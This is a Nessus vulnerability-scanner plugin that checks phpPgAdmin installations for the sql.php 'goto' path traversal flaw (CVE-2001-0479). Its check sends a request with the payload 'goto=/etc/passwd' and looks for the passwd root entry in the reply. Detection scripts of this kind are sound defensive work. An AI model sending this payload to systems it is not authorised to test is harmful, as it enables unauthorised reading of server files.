#
# (C) Tenable Network Security, Inc.
#

# Ref: http://www.securereality.com.au/archives/sradv00008.txt


include("compat.inc");

if(description)
{
 script_id(11117);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2001-0479");
 script_bugtraq_id(2640);
 script_xref(name:"OSVDB", value:"7728");

 script_name(english:"phpPgAdmin sql.php goto Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"It is possible to make the remote phpPgAdmin installation read arbitrary
data on the remote host.

An attacker may use this flaw to read /etc/passwd or any file that your 
web server has the right to access." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpPgAdmin 2.2.2 or newer" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();

 script_summary(english:"Checks for the presence of sql.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);


f[0] = "sql.php";
f[1] = "sql.php3";


for(j=0;f[j];j=j+1)
{
 foreach dir (cgi_dirs())
 {
  r = http_send_recv3(method:"GET", item:string(dir, "/", f[j], "?LIB_INC=1&btnDrop=No&goto=/etc/passwd"), port:port);
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);
 if(egrep(pattern:".*root:.*:.*:0:[01]:.*", string:res))
  {
 	security_warning(port);
	exit(0);
  }
 }
}
